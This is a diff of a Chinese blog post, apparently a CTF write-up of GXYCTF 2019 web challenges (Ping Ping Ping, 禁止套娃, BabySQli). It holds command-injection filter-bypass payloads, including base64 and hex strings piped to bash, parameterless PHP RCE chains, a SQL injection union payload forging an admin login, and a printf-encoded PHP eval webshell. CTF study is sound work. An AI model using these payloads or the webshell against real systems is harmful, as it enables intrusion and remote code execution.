@@ -54,19 +54,19 @@
 <meta property="og:site_name" content="Chen&#39;Blog">
 <meta property="og:description" content="弄完事情吃完饭,都没时间打，BuuCTF复现一下">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/1.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/7.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/2.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/3.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/4.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/5.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/6.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/1.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/7.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/3.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/4.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/5.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/6.jpg">
 <meta property="article:published_time" content="2020-01-10T11:55:51.000Z">
 <meta property="article:modified_time" content="2022-12-11T09:31:21.954Z">
 <meta property="article:author" content="ChenZIDu">
 <meta property="article:tag" content="WEB">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/1.jpg">
+<meta name="twitter:image" content="https://chenzidu.github.io/1.jpg">
 
 <link rel="canonical" href="https://chenzidu.github.io/2020/01/10/GXYCTF-2019-%E5%A4%8D%E7%8E%B0/">
 
@@ -328,10 +328,10 @@
 <a id="more"></a>
 <h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>记得XCTF有道相似题型，当时一看到这题就想起来了，但是写payload的时候多打了个空格。。。试了好多次后没发现，还以为我思路错了。。。</p>
 <p>题目让我们ping ip <br><br>127.0.0.1|ls</p>
-<p><img src="1.jpg" alt=""></p>
+<p><img src="/1.jpg"></p>
 <p>爆出有index.php以及flag.php，但是题目过滤了空格。</p>
-<h4 id="“奇淫技巧”：-ip-cat-IFSls"><a href="#“奇淫技巧”：-ip-cat-IFSls" class="headerlink" title="“奇淫技巧”：?ip=;cat$IFSls;"></a>“奇淫技巧”：?ip=;cat$IFS<code>ls</code>;</h4><p>也能出！！！！学到了！</p>
-<p><img src="7.jpg" alt=""></p>
+<h4 id="“奇淫技巧”：-ip-cat-IFSls"><a href="#“奇淫技巧”：-ip-cat-IFSls" class="headerlink" title="“奇淫技巧”：?ip&#x3D;;cat$IFSls;"></a>“奇淫技巧”：?ip&#x3D;;cat$IFS<code>ls</code>;</h4><p>也能出！！！！学到了！</p>
+<p><img src="/7.jpg"></p>
 <h2 id="linux常见绕过方法"><a href="#linux常见绕过方法" class="headerlink" title="linux常见绕过方法"></a>linux常见绕过方法</h2><ol>
 <li><p>空格过滤</p>
 <blockquote>
@@ -351,20 +351,26 @@
 <li><p>黑名单绕过</p>
 <blockquote>
 <ol>
-<li>拼接绕过:a=l;b=s;$a$b<br></li>
-<li>编码绕过<br><br><b>base64</b>：<br>echo “Y2F0IC9mbGFn”|base64-d|bash<br> ==&gt;cat /flag<br><br><b>hex</b>：<br>echo “636174202f666c6167” | xxd -r -p|bash <br>==&gt;cat /flag<br><br><b>oct</b>：<br><br>$(printf “\154\163”) <br>==&gt;ls<br><br>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”)<br> ==&gt;cat /flag<br><br>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0 <br>==&gt;cat /flag<br><br>#可以通过这样来写webshell,内容为<?php @eval($_POST['c']);?><br>${printf,”\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”} <br>==&gt; 1.php<br></li>
+<li>拼接绕过:a&#x3D;l;b&#x3D;s;$a$b<br></li>
+<li>编码绕过<br><br><b>base64</b>：<br>echo “Y2F0IC9mbGFn”|base64-d|bash<br> &#x3D;&#x3D;&gt;cat &#x2F;flag<br><br><b>hex</b>：<br>echo “636174202f666c6167” | xxd -r -p|bash <br>&#x3D;&#x3D;&gt;cat &#x2F;flag<br><br><b>oct</b>：<br><br>$(printf “\154\163”) <br>&#x3D;&#x3D;&gt;ls<br><br>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”)<br> &#x3D;&#x3D;&gt;cat &#x2F;flag<br><br>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0 <br>&#x3D;&#x3D;&gt;cat &#x2F;flag<br></li>
+</ol>
+</blockquote>
+</li>
+</ol>
+<p>#可以通过这样来写webshell,内容为<?php @eval($_POST['c']);?><br>${printf,”\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”} <br>&#x3D;&#x3D;&gt; 1.php<br></p>
+<blockquote>
+<ol start="3">
 <li>单引号和双引号绕过<br>比如：ca’’t flag 或ca””t flag</li>
 <li>反斜杠绕过<br>比如：ca\t fl\ag</li>
 <li>5、利用Shell 特殊变量绕过<br>例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。<br>$@表示（$@:同样也是获取当前shell的参数，不加引号和$*是一样的，那么加了引号如：”$@” 表示将所有的参数视为不同独立的字符串，相当于”$1” “$2”..）<br>比如：ca$@t fla$@g<br><br>ca$1t fla$2g</li>
 </ol>
 </blockquote>
-</li>
-<li><p>linux中直接查看文件内容的命令<br>cat、tac、more、less、head、tail、nl、sed、sort、uniq、</p>
-</li>
+<ol start="5">
+<li>linux中直接查看文件内容的命令<br>cat、tac、more、less、head、tail、nl、sed、sort、uniq、</li>
 </ol>
-<p>这道题利用$IFS构造空格，发现他还过滤了flag以及/等字符。利用变量构造。</p>
+<p>这道题利用$IFS构造空格，发现他还过滤了flag以及&#x2F;等字符。利用变量构造。</p>
 <p>payload：<br><br><code>?ip=127.0.0.1;b=lag;a=f;cat$IFS$a$b.php</code></p>
-<p><img src="2.jpg" alt=""></p>
+<p><img src="/2.jpg"></p>
 <hr>
 <h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>参考<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/#comment-15" target="_blank" rel="noopener">Pdsdt</a></p>
 <p><strong>无参数RCE</strong></p>
@@ -374,10 +380,10 @@
 <blockquote>
 <p>localeconv()   函数返回一包含本地数字及货币格式信息的数组。<br><br>scandir()   列出 images 目录中的文件和目录。<br><br>readfile()  输出一个文件。<br><br>current()       返回数组中的当前单元, 默认取第一个值。<br><br>pos()           current() 的别名。<br><br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br><br>array_reverse()以相反的元素顺序返回数组。<br><br>highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</p>
 </blockquote>
-<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组，结合pos()能得到.，也就是当前目录==&gt;然后再加上scandir就能获取当前目录的所有的文件</p>
+<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组，结合pos()能得到.，也就是当前目录&#x3D;&#x3D;&gt;然后再加上scandir就能获取当前目录的所有的文件</p>
 <p>payload:<br><br>print_r(scandir(pos(localeconv())));</p>
-<p><img src="3.jpg" alt=""></p>
-<p>之后我们利用array_reverse() 将数组内容反转一下，利用next()指向flag.php文件==&gt;highlight_file()高亮输出。</p>
+<p><img src="/3.jpg"></p>
+<p>之后我们利用array_reverse() 将数组内容反转一下，利用next()指向flag.php文件&#x3D;&#x3D;&gt;highlight_file()高亮输出。</p>
 <p>payload:<br><br><code>?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p>
 <hr>
 <h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>在进行sql注入探测中，发现有base32解密， 解完还有一层base64，最后出来sql语句：<br><br><code>select * from user where username = &#39;$name&#39;</code><br></p>
@@ -385,8 +391,8 @@
 <p><code>Error: The used SELECT statements have a different number of columns</code><br><br>通过列数不同报错，可以确定有三个字段，当为三个参数时，报账号错误<br></p>
 <p><code>0&#39; union select 0,1,3#&amp;pw=123</code><br></p>
 <p><code>wrong user!</code></p>
-<p><img src="4.jpg" alt=""></p>
-<p><img src="5.jpg" alt=""><br>当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据<br><br>当查询到有的值：<br><br><img src="6.jpg" alt=""></p>
+<p><img src="/4.jpg"></p>
+<p><img src="/5.jpg"><br>当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据<br><br>当查询到有的值：<br><br><img src="/6.jpg"></p>
 <p>构造payload:<br></p>
 <p><code>0&#39; union select 0,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code></p>
 <h2 id="【未完待续】"><a href="#【未完待续】" class="headerlink" title="【未完待续】"></a>【未完待续】</h2>
@@ -468,7 +474,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">95</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -540,7 +546,7 @@
 <div class="copyright">
   
   &copy; 2018 – 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
